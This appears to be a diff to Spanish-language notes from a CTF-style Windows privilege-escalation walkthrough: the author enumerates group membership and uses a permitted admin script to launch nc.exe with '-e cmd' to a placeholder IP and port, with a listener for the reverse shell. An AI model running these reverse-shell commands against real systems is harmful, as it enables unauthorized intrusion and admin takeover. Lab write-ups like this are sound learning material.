@@ -1,3 +1,24 @@
 Root.txt
 
-path/script.ps1 -Argument "IP -e cmd"
+Una vez nos conectamos con de forma remota, abrimos una powershell y empezamos con la enumeracion y busqueda de alguna vulnerabilidad que nos permita realizar la escalada de privilegios.
+
+Miramos nuestros prvilegios:
+    - whoami /all
+    - net user username
+
+Vemos que estamos dentro de un grupo diferente alo normal, vemos si nos da algo de infromacion su descripcion:
+    net localgroup group_name 
+
+En la descripcion pone que podemos ejecutar el binario nc.exe con privilegios administrador de la siguiente forma:
+C:\Users\Administrator\Desktop\script.exe -ArgumentList 'Args'
+
+En nuestra terminal de linux ejecutamos:
+    nc -lvp PORT
+
+y en la powershell tenemos que ejecutar el nc.exe de la siguiente manera:
+    nc.exe IP PORT -e cmd
+    
+pero con la sintaxis que nos dice:
+    C:\Users\Administrator\Desktop\script.exe -ArgumentList 'IP PORT -e cmd'
+
+
